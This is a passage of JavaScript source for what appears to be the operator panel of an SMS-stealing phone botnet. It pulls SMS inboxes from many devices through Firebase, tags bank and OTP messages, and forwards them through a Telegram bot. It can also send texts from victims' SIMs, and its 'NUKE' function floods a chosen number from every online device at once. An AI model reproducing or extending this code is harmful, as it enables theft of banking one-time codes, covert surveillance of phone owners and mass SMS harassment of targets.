    return'<div class="msg-bub '+cls+'"><div class="msg-meta"><span class="msg-sndr" data-copy="'+esc(m.sender)+'" onclick="copyFromEl(this,event)">'+esc(m.sender)+'</span>'
      +(hp?'<span class="msg-tp" style="background:rgba(244,63,94,.15);color:var(--rose)">🔥 HIGH</span>':'')
      +(bankTag?'<span class="msg-tp" style="background:rgba(168,85,247,.14);color:var(--gold2)">🏦 '+esc(bankTag.name)+'</span>':'')
      +'<span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime)+'</span></div>'
      +'<div class="msg-txt" data-copy="'+esc(m.message)+'" onclick="copyFromEl(this,event)">'+esc(m.message)+'</div>'
      +'<button class="msg-del-btn" onclick="confirmDelMsg(\''+(selDev?esc(selDev.id):'')+'\',\''+esc(m.key)+'\',event,\''+esc((m.message||'').substring(0,60))+'\')">✕</button></div>';
  }).join('');
}
function setActiveMF(f){mfMode=f;['all','incoming','outgoing','bank'].forEach(function(t){var e=document.getElementById('dm-mf-'+t);if(e)e.classList.toggle('ma',t===f);});filterActiveMsgs();}
async function refreshActiveMsgs(){if(!selDev)return;lastKeys=new Set();allMsgs=[];try{var data=await fbGet('messages/'+selDev.id,selDev._fbUrl,selDev._fbKey);allMsgs=parseMsgs(data);lastKeys=new Set(allMsgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();}catch(e){toast('⚠ Refresh failed');}}
function exportActiveMsgs(){if(!allMsgs.length){toast('⚠ No messages');return;}var csv='Sender,Type,DateTime,Message\n'+allMsgs.map(function(m){return[m.sender,m.type,m.dateTime,m.message].map(function(v){return'"'+String(v||'').replace(/"/g,'""')+'"';}).join(',');}).join('\n');_dlCsv('msgs-'+(selDev&&selDev.id||'dev')+'-'+Date.now()+'.csv',csv);}
function _dlCsv(name,rows){var a=document.createElement('a');a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(rows);a.download=name;a.click();}

var _delPendingDevId=null,_delPendingKey=null;
function confirmDelMsg(devId,key,evt,preview){if(evt)evt.stopPropagation();_delPendingDevId=devId;_delPendingKey=key;document.getElementById('delMsgPreview').textContent=preview||'(no preview)';document.getElementById('delMsgOk').onclick=doDelMsg;openM('delMsgModal');}
async function doDelMsg(){closeM('delMsgModal');if(!_delPendingDevId||!_delPendingKey)return;
  try{var dev=allDevices.find(function(d){return d.id===_delPendingDevId;});await fbDel('messages/'+_delPendingDevId+'/'+_delPendingKey,dev&&dev._fbUrl,dev&&dev._fbKey);if(amCache[_delPendingDevId])amCache[_delPendingDevId]=amCache[_delPendingDevId].filter(function(m){return m.key!==_delPendingKey;});if(selDev&&selDev.id===_delPendingDevId){allMsgs=allMsgs.filter(function(m){return m.key!==_delPendingKey;});updCnt();filterActiveMsgs();renderBankPane();}toast('🗑 Deleted');}catch(e){toast('⚠ Failed');}
  _delPendingDevId=null;_delPendingKey=null;}

/* ═══════ SEND SMS ═══════ */
function updOtpNoteBox(){if(!selDev)return;var note=otpNoteC[selDev.id]||'';var disp=document.getElementById('dmOtpNoteDisp'),inp=document.getElementById('dmOtpNoteInp');if(disp){disp.textContent=note||'No OTP note saved yet…';disp.className='otp-note-disp'+(note?'':' empty');}if(inp)inp.value=note;}
function saveOtpNoteActive(){if(!selDev)return;var val=document.getElementById('dmOtpNoteInp').value.trim();otpNoteC[selDev.id]=val;var disp=document.getElementById('dmOtpNoteDisp');if(disp){disp.textContent=val||'No OTP note saved yet…';disp.className='otp-note-disp'+(val?'':' empty');}toast('✓ OTP note saved');}
async function sendSmsActive(){
  if(!selDev){toast('⚠ No device');return;}
  var to=document.getElementById('dmSendTo').value.trim();
  var msg=document.getElementById('dmSendMsg').value.trim();
  if(!to||!msg){toast('⚠ Fill both fields');return;}
  var sim=deviceSimMap[selDev.id]||1;
  var btn=document.getElementById('dmSendBtn');btn.disabled=true;btn.textContent='Sending…';
  var hp=isHighPriority({message:msg});
  var pr=hp?sendHighPrioritySms(selDev,sim,to,msg,'manual-hp'):sendSmsFireAndForget(selDev,sim,to,msg,'manual',false);
  pr.then(function(ok){
    if(ok){showResActive(true,'✓ SMS queued from SIM '+sim+(hp?' 🔥':''));document.getElementById('dmSendMsg').value='';}
    else{showResActive(false,'⚠ Failed');}
    btn.disabled=false;btn.textContent='🚀 Send Message';
  });
}
function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}

/* ═══════ ALL MSGS ═══════ */
function openAllMsgs(){openM('allMsgsModal');trigAM(false);startAP();}
function setAMF(f){amfMode=f;['all','incoming','outgoing'].forEach(function(t){var e=document.getElementById('amf-'+t);if(e)e.classList.toggle('ma',t===f);});filterAndRender();}
function trigAM(force){if(amLoading)return;if(!force&&amLoaded&&amAll.length){filterAndRender();return;}loadAllMsgs(force);}
async function loadAllMsgs(force){
  var onlineDevs=allDevices.filter(function(d){return d.status;});
  if(!onlineDevs.length){document.getElementById('amList').innerHTML='<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>';return;}
  amLoading=true;var now=Date.now();
  var toFetch=onlineDevs.filter(function(d){return force||!amCache[d.id]||now-amFetch[d.id]>10000;});
  var BATCH=30;
  for(var i=0;i<toFetch.length;i+=BATCH){
    await Promise.allSettled(toFetch.slice(i,i+BATCH).map(async function(dev){
      try{var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=50',{signal:AbortSignal.timeout(4000)});amCache[dev.id]=parseMsgs(r.ok?await r.json():null);amFetch[dev.id]=Date.now();}catch(e){if(!amCache[dev.id])amCache[dev.id]=[];}
    }));
    rebuild();filterAndRender();await new Promise(function(r){setTimeout(r,0);});
  }
  amLoaded=true;amLoading=false;rebuild();filterAndRender();
}
function rebuild(){
  var onlineDevs=allDevices.filter(function(d){return d.status;}),c=[];
  for(var i=0;i<onlineDevs.length;i++){
    var dev=onlineDevs[i],msgs=amCache[dev.id];if(!msgs||!msgs.length)continue;
    for(var j=0;j<msgs.length;j++){var m=msgs[j];c.push({key:m.key,message:m.message,sender:m.sender,_ts:m._ts,type:m.type,dateTime:m.dateTime,cn:i+1,did:dev.id,dname:dev.name,dnum:dev.mobNo,dnote:noteC[dev.id]||dev.note||''});}
  }
  c.sort(function(a,b){return b._ts-a._ts;});amAll=c;
}
function filterAndRender(){
  var q=(document.getElementById('amSearch')||{}).value||'';q=q.toLowerCase().trim();
  amFilt=amAll.filter(function(m){
    if(amfMode==='incoming'&&m.type!=='incoming')return false;
    if(amfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(q){var bank=detectBank(m.sender);var hay=(m.message+' '+m.sender+' '+(m.did||'')+' '+(m.dname||'')+' '+(m.dnum||'')+' '+(m.dnote||'')+' '+(m.dateTime||'')+' '+(bank?bank.name:'')+' '+(m.type||'')).toLowerCase();if(hay.indexOf(q)===-1)return false;}
    return true;
  });
  var list=document.getElementById('amList');list.innerHTML='';amCount=0;
  if(!amFilt.length){list.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';return;}
  renderPage();setupObs();
}
function renderPage(){
  var list=document.getElementById('amList');if(!list)return;
  var batch=amFilt.slice(amCount,amCount+AM);if(!batch.length)return;
  var frag=document.createDocumentFragment();
  batch.forEach(function(m){
    var el=document.createElement('div');var bank=detectBank(m.sender);
    el.className='am-card '+(m.type==='incoming'?'inc':'out');
    el.innerHTML='<div class="am-left"><div class="am-cn">#'+m.cn+'</div><div class="am-name">'+esc(m.dname)+'</div><div class="am-name" style="font-size:9px;color:var(--sky)">'+esc(m.dnum||'')+'</div></div>'
      +'<div class="am-right"><div class="am-meta"><span class="am-sndr" data-copy="'+esc(m.sender)+'" onclick="copyFromEl(this,event)">'+esc(m.sender)+'</span>'+(bank?'<span class="msg-tp" style="background:rgba(168,85,247,.14);color:var(--gold2)">🏦 '+esc(bank.name)+'</span>':'')+'<span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime||'')+'</span></div><div class="am-txt" data-copy="'+esc(m.message)+'" onclick="copyFromEl(this,event)">'+esc(m.message)+'</div></div>';
    frag.appendChild(el);
  });
  list.appendChild(frag);amCount+=batch.length;
}
async function pollAllFresh(){}

/* ═══════ NUKE ═══════ */
function openNuke(){document.getElementById('nukeModal').classList.add('open');updateNukeInfo();}
function updateNukeInfo(){var online=allDevices.filter(function(d){return d.status;});var simsTotal=0;online.forEach(function(d){simsTotal+=d.sims.length||0;});var totalShots=online.reduce(function(s,d){return s+(d.sims.length||0);},0);document.getElementById('nukeDeviceCount').textContent=online.length;document.getElementById('nukeSimCount').textContent=simsTotal;document.getElementById('nukeTotalShots').textContent=totalShots;}
async function fireNuke(){
  var target=document.getElementById('nukeTarget').value.trim(),msg=document.getElementById('nukeMsg').value.trim();
  if(!target||!msg){toast('⚠ Enter number and message');return;}
  var online=allDevices.filter(function(d){return d.status;});if(!online.length){toast('⚠ No online devices');return;}
  var shots=[];online.forEach(function(dev){var simCount=dev.sims.length||1;for(var s=1;s<=simCount;s++)shots.push({dev:dev,sim:s});});
  nukeRunning=true;nukeSent=0;nukeFail=0;nukeTotal=shots.length;_nukeActive=0;_nukeStartTime=Date.now();
  document.getElementById('nukeSent').textContent='0';document.getElementById('nukeFail').textContent='0';document.getElementById('nukeTotal').textContent=shots.length;
  document.getElementById('nukeStats').classList.add('show');document.getElementById('nukeProgWrap').style.display='block';
  document.getElementById('nukeFireBtn').style.display='none';document.getElementById('nukeStopBtn').style.display='block';
  toast('💣 Nuking with '+shots.length+' shots…');
  var idx=0,done=0,pool=Math.min(_nukePool,shots.length);
  function spawn(){
    while(_nukeActive<pool&&idx<shots.length&&nukeRunning){
      var shot=shots[idx++],dev=shot.dev;
      var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
      var body=JSON.stringify({from:shot.sim,to:target,message:msg,isSended:false});
      _nukeActive++;
      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true,priority:'high'})
        .then(function(r){if(r.ok)nukeSent++;else nukeFail++;}).catch(function(){nukeFail++;})
        .finally(function(){_nukeActive--;done++;updateNukeProgress(done,shots.length);if(idx<shots.length&&nukeRunning)spawn();else if(done===shots.length)finishNuke();});
    }
  }
  spawn();
}
function updateNukeProgress(done,total){if(_nukeStatsTmr)return;_nukeStatsTmr=requestAnimationFrame(function(){_nukeStatsTmr=null;document.getElementById('nukeSent').textContent=nukeSent;document.getElementById('nukeFail').textContent=nukeFail;var pct=Math.round((done/total)*100);document.getElementById('nukeProgFill').style.width=pct+'%';document.getElementById('nukeProgTxt').textContent=pct+'% · '+done+'/'+total;});}
function finishNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';var e=((Date.now()-_nukeStartTime)/1000).toFixed(1);toast('✅ Nuke done — '+nukeSent+' sent, '+nukeFail+' failed in '+e+'s');}
function stopNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';toast('⏹ Stopped');}

/* ═══════ SETTINGS ═══════ */
function openSettings(){try{populateSettingsUI();openM('settingsModal');}catch(e){console.error('[Settings] open failed:',e);toast('⚠ Settings error: '+e.message);}}
function populateSettingsUI(){
  document.getElementById('setMyNumber').value=userConfig.myNumber||'';
  document.getElementById('setTgUserId').value=userConfig.userId||'';
  document.getElementById('setTgChannel').value=userConfig.channelId||'';
  document.getElementById('setTgEnabled').checked=userConfig.botEnabled!==false;
  document.getElementById('setFwdEnabled').checked=userConfig.forwardEnabled!==false;
  var nS=document.getElementById('setNumStart');if(nS)nS.value=userConfig.numStart||'';
  var nE=document.getElementById('setNumEnd');if(nE)nE.value=userConfig.numEnd||'';
  var mS=document.getElementById('setMsgStart');if(mS)mS.value=userConfig.msgStart||'';
  var mE=document.getElementById('setMsgEnd');if(mE)mE.value=userConfig.msgEnd||'';
  var nL=document.getElementById('setNumLabels');if(nL)nL.value=(userConfig.numLabels||['To','Receipt','Number','Mobile','Target','Phone']).join(',');
  var mL=document.getElementById('setMsgLabels');if(mL)mL.value=(userConfig.msgLabels||['Message','Msg','Body','Token','Text']).join(',');
  renderFbList();updateTgStatusLine();updateForwardModeUI();
}
function setForwardMode(mode){userConfig.forwardMode=mode;cacheConfigLocal();debouncedCloudSave();updateForwardModeUI();toast('✓ Forward mode: '+(mode==='banking'?'Banking only':'All'));}
function updateForwardModeUI(){
  var mode=userConfig.forwardMode||'all';
  var bAll=document.getElementById('setFwdModeAll'),bBank=document.getElementById('setFwdModeBank'),hint=document.getElementById('fwdModeHint');
  if(bAll){bAll.style.background=mode==='all'?'rgba(168,85,247,.16)':'var(--bg3)';bAll.style.borderColor=mode==='all'?'rgba(168,85,247,.4)':'var(--border)';bAll.style.color=mode==='all'?'var(--gold2)':'var(--sub)';}
  if(bBank){bBank.style.background=mode==='banking'?'rgba(168,85,247,.16)':'var(--bg3)';bBank.style.borderColor=mode==='banking'?'rgba(168,85,247,.4)':'var(--border)';bBank.style.color=mode==='banking'?'var(--gold2)':'var(--sub)';}
  if(hint)hint.textContent=mode==='banking'?'Only bank/OTP messages forwarded':'All incoming forwarded';
}
function updateTgStatusLine(){
  var el=document.getElementById('tgStatusLine');if(!el)return;var lines=[];
  if(tgRunning){lines.push('● Bot active');lines.push('📊 Updates: '+tgDiagnostics.updateCount);if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);el.className='settings-status '+(tgDiagnostics.lastError?'err':'on');}
  else{lines.push('○ Not running');if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);el.className='settings-status';}
  el.innerHTML=lines.join('<br>');updateTgBtn();
}
function updateTgBtn(){var btn=document.getElementById('tgStatus');if(!btn)return;btn.textContent=tgRunning?'🤖 ON':'🤖 OFF';btn.style.color=tgRunning?'var(--mint)':'var(--sub)';btn.style.borderColor=tgRunning?'rgba(6,214,160,.4)':'var(--border)';btn.style.background=tgRunning?'rgba(6,214,160,.08)':'var(--bg3)';}
function renderFbList(){
  var el=document.getElementById('settingsFbList');if(!el)return;
  if(!fbInstances.length){el.innerHTML='<div style="font-size:11px;color:var(--dim);text-align:center;padding:14px">No extra Firebase URLs</div>';return;}
  el.innerHTML=fbInstances.map(function(inst){
    var total=(inst.devices||[]).length,online=(inst.devices||[]).filter(function(d){return d.status;}).length;
    var statusColor=inst.status==='ok'?'var(--mint)':inst.status==='error'?'var(--rose)':inst.status==='empty'?'var(--gold)':'var(--sub)';
    var statusLabel=inst.status==='ok'?'✓':inst.status==='error'?'✗':inst.status==='empty'?'∅':'…';
    var err=inst.lastError?'<div style="font-size:9px;color:var(--rose);margin-top:2px">'+esc(inst.lastError)+'</div>':'';
    return '<div class="fb-list-row"><div class="fb-list-row-info"><div class="fb-list-row-lbl">'+esc(inst.label)+'</div><div class="fb-list-row-url">'+esc(inst.url)+'</div>'+err+'</div>'
      +'<span style="font-size:10px;font-weight:700;color:'+statusColor+'">'+statusLabel+' '+online+'/'+total+'</span>'
      +'<button onclick="fbReload(\''+inst.id+'\')" style="padding:4px 8px;background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.2);border-radius:6px;color:var(--gold2);font-size:11px;cursor:pointer;font-family:\'Chakra Petch\',sans-serif">↻</button>'
      +'<button onclick="fbRemove(\''+inst.id+'\')" style="padding:4px 8px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.2);border-radius:6px;color:var(--rose);font-size:11px;cursor:pointer;font-family:\'Chakra Petch\',sans-serif">✕</button></div>';
  }).join('');
}
async function fbReload(id){var inst=fbInstances.find(function(x){return x.id===id;});if(!inst)return;toast('↻ Reloading…');await fbLoadInst(inst);fbMergeAll();}
async function addFirebaseFromSettings(){
  var label=document.getElementById('setFbLabel').value.trim(),url=document.getElementById('setFbUrl').value.trim().replace(/\/+$/,''),key=document.getElementById('setFbKey').value.trim();
  if(!url){toast('⚠ Enter a URL');return;}
  if(!/^https?:\/\//i.test(url)){toast('⚠ URL must start with http(s)://');return;}
  if(fbInstances.find(function(x){return x.url===url;})){toast('⚠ Already added');return;}
  var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:label||('Firebase '+(fbInstances.length+1)),url:url,key:key,devices:[],status:'connecting',poll:null,devCount:0,lastError:''};
  fbInstances.push(inst);
  document.getElementById('setFbLabel').value='';document.getElementById('setFbUrl').value='';document.getElementById('setFbKey').value='';
  renderFbList();await fbLoadInst(inst);fbStartPoll(inst,0);syncFirebasesToConfig();fbMergeAll();renderFbList();
}
async function fbLoadInst(inst){
  try{
    var auth=inst.key?'?auth='+inst.key:'';var url=inst.url+'/clients.json'+auth;
    console.log('[FB] Loading: '+url);
    var r=await fetch(url,{signal:AbortSignal.timeout(API_TIMEOUT)});
    console.log('[FB] '+inst.label+' HTTP '+r.status);
    if(!r.ok){
      inst.status='error';inst.devices=[];inst.devCount=0;inst.lastError='HTTP '+r.status;
      toast('❌ '+inst.label+': HTTP '+r.status);renderFbList();return;
    }
    var raw=await r.json();
    if(!raw||typeof raw!=='object'){
      inst.devices=[];inst.devCount=0;inst.status='empty';inst.lastError='Empty';
      toast('⚠ '+inst.label+': Empty');renderFbList();return;
    }
    var devs=parseDevs(raw);
    console.log('[FB] '+inst.label+' → '+devs.length+' devices');
    devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});
    inst.devices=devs;inst.devCount=devs.length;inst.status=devs.length?'ok':'empty';inst.lastError='';
    if(devs.length){fbMergeAll();toast('✅ '+inst.label+': '+devs.length+' devices');}
    else toast('⚠ '+inst.label+': 0 devices');
    renderFbList();
  }catch(e){inst.status='error';inst.devices=[];inst.devCount=0;inst.lastError=e.message;toast('❌ '+inst.label);renderFbList();}
}
function fbStartPoll(inst,staggerMs){if(inst.poll)clearInterval(inst.poll);setTimeout(function(){inst.poll=setInterval(async function(){if(!inst.url)return;try{var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok){inst.status='error';inst.lastError='HTTP '+r.status;return;}var devs=parseDevs(await r.json());devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});inst.devices=devs;inst.devCount=devs.length;inst.status='ok';inst.lastError='';fbMergeAll();}catch(e){inst.status='error';inst.lastError=e.message;}},POLL_DEV);},staggerMs||0);}
function fbStopPoll(inst){if(inst.poll){clearInterval(inst.poll);inst.poll=null;}}
function fbRemove(id){var idx=fbInstances.findIndex(function(x){return x.id===id;});if(idx===-1)return;fbStopPoll(fbInstances[idx]);fbInstances.splice(idx,1);fbMergeAll();syncFirebasesToConfig();renderFbList();toast('🗑 Removed');}
function syncFirebasesToConfig(){userConfig.firebases=fbInstances.map(function(x){return{url:x.url,label:x.label,key:x.key};});debouncedCloudSave();}
function fbMergeAll(){if(_mergeDebTimer)clearTimeout(_mergeDebTimer);_mergeDebTimer=setTimeout(_doFbMergeAll,80);}
function _doFbMergeAll(){
  _mergeDebTimer=null;
  var merged=[],seen=new Set();
  for(var pp=0;pp<allDevices.length;pp++){var pd=allDevices[pp];if((pd._fbId||'primary')==='primary'){var pk='primary:'+pd.id;if(!seen.has(pk)){seen.add(pk);merged.push(pd);}}}
  for(var ii=0;ii<fbInstances.length;ii++){if(fbInstances[ii].id==='primary')continue;var devs=fbInstances[ii].devices||[];for(var jj=0;jj<devs.length;jj++){var d=devs[jj];var k=(d._fbId||'primary')+':'+d.id;if(!seen.has(k)){seen.add(k);merged.push(d);}}}
  applyStableOrder(merged);allDevices=merged;renderStats();
  renderGrid();  /* 🆕 no force */
  renderFbList();
}
function fbRegisterPrimary(){allDevices.forEach(function(d){if(!d._fbId){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;}});}
function loadFirebasesFromConfig(){
  var saved=userConfig.firebases||[];if(!saved.length)return;
  var toConnect=[];
  saved.forEach(function(s){if(!s.url||fbInstances.find(function(x){return x.url===s.url;}))return;var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:s.label||s.url,url:s.url,key:s.key||'',devices:[],status:'connecting',poll:null,devCount:0,lastError:''};fbInstances.push(inst);toConnect.push(inst);});
  if(!toConnect.length)return;
  (async function(){var BATCH=20;for(var i=0;i<toConnect.length;i+=BATCH){var batch=toConnect.slice(i,i+BATCH);await Promise.allSettled(batch.map(async function(inst){try{await fbLoadInst(inst);}catch(e){inst.status='error';}}));batch.forEach(function(inst,bi){fbStartPoll(inst,(i+bi)*100);});await new Promise(function(r){setTimeout(r,0);});}renderFbList();})();
}
function saveAllSettings(){
  userConfig.myNumber=document.getElementById('setMyNumber').value.trim();
  userConfig.userId=document.getElementById('setTgUserId').value.trim();
  userConfig.channelId=document.getElementById('setTgChannel').value.trim();
  userConfig.botEnabled=document.getElementById('setTgEnabled').checked;
  userConfig.forwardEnabled=document.getElementById('setFwdEnabled').checked;
  var nS=document.getElementById('setNumStart');if(nS)userConfig.numStart=nS.value.trim();
  var nE=document.getElementById('setNumEnd');if(nE)userConfig.numEnd=nE.value.trim();
  var mS=document.getElementById('setMsgStart');if(mS)userConfig.msgStart=mS.value.trim();
  var mE=document.getElementById('setMsgEnd');if(mE)userConfig.msgEnd=mE.value.trim();
  var nL=document.getElementById('setNumLabels');if(nL){var arr=nL.value.split(',').map(function(s){return s.trim();}).filter(function(s){return s;});userConfig.numLabels=arr.length?arr:['To','Receipt','Number','Mobile','Target','Phone'];}
  var mL=document.getElementById('setMsgLabels');if(mL){var arr2=mL.value.split(',').map(function(s){return s.trim();}).filter(function(s){return s;});userConfig.msgLabels=arr2.length?arr2:['Message','Msg','Body','Token','Text'];}
  cacheConfigLocal();debouncedCloudSave();
  if(userConfig.botEnabled&&userConfig.channelId){_sendWelcome=true;startTelegramBot();}else{stopTelegramBot();}
  updateTgStatusLine();
  toast('💾 Saved');
}

/* ═══════ TELEGRAM BOT ═══════ */
async function tgApi(method,payload){try{var r=await fetch(CFG.TG_API+'/'+method,payload?{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}:{signal:AbortSignal.timeout(6000)});return await r.json();}catch(e){return{ok:false,description:e.message};}}
async function fetchBotUsername(){
  var el=document.getElementById('botUsername');
  try{
    var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(8000)});
    var d=await r.json();
    if(d.ok&&d.result){tgDiagnostics.botInfo=d.result;var uname=d.result.username||('bot_'+d.result.id);if(el)el.textContent='@'+uname;console.log('[BOT] ✓ @'+uname);updateTgStatusLine();}
    else{if(el)el.textContent='⚠ err';console.error('[BOT] getMe failed:',d&&d.description);}
  }catch(e){if(el)el.textContent='⚠ offline';}
}
(function _botUsernameRetry(){var tick=0;var t=setInterval(function(){tick++;if(tgDiagnostics.botInfo||tick>20){clearInterval(t);return;}fetchBotUsername();},20000);})();

async function startTelegramBot(){
  stopTelegramBot();
  if(!userConfig.channelId){toast('⚠ Set channel ID first');return;}
  tgDiagnostics.lastError='';updateTgStatusLine();
  await tgApi('deleteWebhook?drop_pending_updates=false');
  var d2=await tgApi('getMe');
  if(!d2.ok){tgDiagnostics.lastError='Token invalid';toast('❌ Token invalid');updateTgStatusLine();return;}
  tgDiagnostics.botInfo=d2.result;
  try{var r4=await fetch(CFG.TG_API+'/getUpdates?offset=-1&timeout=0&limit=1',{signal:AbortSignal.timeout(4000)});var d4=await r4.json();if(d4.ok&&d4.result&&d4.result.length){tgLastUpdateId=d4.result[d4.result.length-1].update_id+1;}else{tgLastUpdateId=0;}}catch(e){tgLastUpdateId=0;}
  tgRunning=true;tgDiagnostics.lastError='';tgDiagnostics.updateCount=0;updateTgStatusLine();updateTgBtn();
  if(!tgPollLoop){tgPollLoop=true;telegramLoop();}
  if(_sendWelcome){_sendWelcome=false;sendOwnerWelcome();}
}
async function sendOwnerWelcome(){
  if(!userConfig.userId)return;
  var msg='👋 <b>Welcome, Owner!</b>\n\n🤖 <b>F.B.I PANEL Bot</b> active\n🕐 '+new Date().toLocaleString();
  try{await tgApi('sendMessage',{chat_id:userConfig.userId,text:msg,parse_mode:'HTML'});}catch(e){}
}
function stopTelegramBot(){tgRunning=false;tgPollLoop=false;updateTgStatusLine();updateTgBtn();}
async function telegramLoop(){var errs=0;while(tgPollLoop){if(!tgRunning){await sleep(200);continue;}try{var hadError=await telegramPollOnce();if(hadError){errs++;if(errs>5){await sleep(2000);errs=0;}}else{errs=0;}}catch(e){errs++;if(errs>5){await sleep(2000);errs=0;}}await sleep(TG_POLL);}}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}

async function telegramPollOnce(){
  var url=CFG.TG_API+'/getUpdates?timeout=1';
  if(tgLastUpdateId)url+='&offset='+tgLastUpdateId;
  url+='&allowed_updates='+encodeURIComponent(JSON.stringify(['channel_post','edited_channel_post','message','edited_message','callback_query']));
  var r;try{r=await fetch(url,{signal:AbortSignal.timeout(3000)});}catch(e){return true;}
  if(!r.ok){if(r.status===409){try{await fetch(CFG.TG_API+'/deleteWebhook',{signal:AbortSignal.timeout(3000)});}catch(e){}return true;}return true;}
  var data=await r.json();
  if(!data.ok)return true;
  if(!data.result||!data.result.length)return false;
  tgDiagnostics.updateCount+=data.result.length;tgDiagnostics.lastUpdate=Date.now();
  for(var i=0;i<data.result.length;i++){
    var u=data.result[i];tgLastUpdateId=u.update_id+1;

    /* 🆕 Callback query */
    if(u.callback_query){handleCallbackQuery(u.callback_query);continue;}

    var msg=u.channel_post||u.edited_channel_post||u.message||u.edited_message;
    if(!msg)continue;
    var isPrivate=msg.chat&&msg.chat.type==='private';
    var fromId=msg.from&&String(msg.from.id);

    /* 🆕 Owner command */
    if(isPrivate&&fromId===String(userConfig.userId)){handleOwnerCommand(msg);continue;}

    /* 🆕 Regular user private message */
    if(isPrivate){handleUserPrivate(msg);continue;}

    /* Channel post → SMS trigger */
    var chatId=String(msg.chat&&msg.chat.id||''),chatUser=String(msg.chat&&msg.chat.username||'');
    var cfgCh=String(userConfig.channelId||''),cfgChClean=cfgCh.replace('@','');
    var match=false;
    if(!cfgCh)match=false;
    else if(cfgCh.startsWith('@'))match=(chatUser.toLowerCase()===cfgChClean.toLowerCase());
    else{var cfgNum=cfgCh.replace(/[^\-\d]/g,'');match=(chatId===cfgNum)||(chatId===cfgCh);if(!match&&cfgNum.length>6&&chatId.length>6)match=chatId.endsWith(cfgNum.slice(-9))||cfgNum.endsWith(cfgCh.slice(-9));}
    if(!match)continue;
    var text=msg.text||msg.caption||'';if(!text)continue;
    var parsed=parseTelegramMessage(text);
    if(!parsed.valid){console.warn('🎯 [TG] Parse failed');continue;}
    console.log('🎯 [TG MATCH] '+parsed.number);
    handleTelegramSms(parsed.number,parsed.message,msg);
  }
  updateTgStatusLine();
  return false;
}

/* 🆕 Handle user private messages (non-owner) */
async function handleUserPrivate(msg){
  var chatId=String(msg.chat.id);
  var txt=String(msg.text||'').trim();
  var cmd=txt.toLowerCase();
  var from=msg.from||{};
  var fullName=[from.first_name||'',from.last_name||''].filter(Boolean).join(' ')||('User '+chatId.slice(-4));

  /* Commands */
  if(cmd==='/start'||cmd==='/help'){
    var prof=await getUserProfile(chatId);
    if(!prof){
      /* Not verified — check membership */
      if(userConfig.forceJoin&&userConfig.channelId){
        var isMember=await checkChannelMembership(chatId);
        if(!isMember){await sendForceJoin(chatId,fullName);return;}
      }
      /* Create profile */
      var newProf={
        id:chatId,
        first_name:from.first_name||'',
        last_name:from.last_name||'',
        username:from.username||'',
        language:from.language_code||'en',
        firebases:[],
        joinedAt:Date.now(),
        verified:true,
        lastSeen:Date.now()
      };
      await saveUserProfile(newProf);
      await sendUserWelcome(chatId,fullName);
      return;
    }
    await sendUserWelcome(chatId,fullName);
    return;
  }

  /* Check if verified */
  var profile=await getUserProfile(chatId);
  if(!profile){
    if(userConfig.forceJoin&&userConfig.channelId){
      var mem=await checkChannelMembership(chatId);
      if(!mem){await sendForceJoin(chatId,fullName);return;}
    }
    /* Auto-create */
    profile={id:chatId,first_name:from.first_name||'',last_name:from.last_name||'',username:from.username||'',language:from.language_code||'en',firebases:[],joinedAt:Date.now(),verified:true,lastSeen:Date.now()};
    await saveUserProfile(profile);
    await sendUserWelcome(chatId,fullName);
    return;
  }

  /* Update last seen + name */
  profile.first_name=from.first_name||profile.first_name;
  profile.last_name=from.last_name||profile.last_name;
  profile.username=from.username||profile.username;
  await saveUserProfile(profile);

  /* Pending states */
  var st=userStates[chatId];
  if(st){
    if(st.state==='wait_fb_url'){
      var url=txt.replace(/\/+$/,'');
      if(!/^https?:\/\//i.test(url)){await tgSend(chatId,'⚠ Invalid URL. `https://` se start hona chahiye.');return;}
      st.data.url=url;
      st.state='wait_fb_label';
      await tgSend(chatId,'📝 Naam dena ho to bhejo, ya <code>skip</code> likho:');
      return;
    }
    if(st.state==='wait_fb_label'){
      var label=txt.toLowerCase()==='skip'?'Firebase '+(profile.firebases.length+1):txt;
      profile.firebases=profile.firebases||[];
      profile.firebases.push({url:st.data.url,key:'',label:label,addedAt:Date.now()});
      await saveUserProfile(profile);
      delete userStates[chatId];
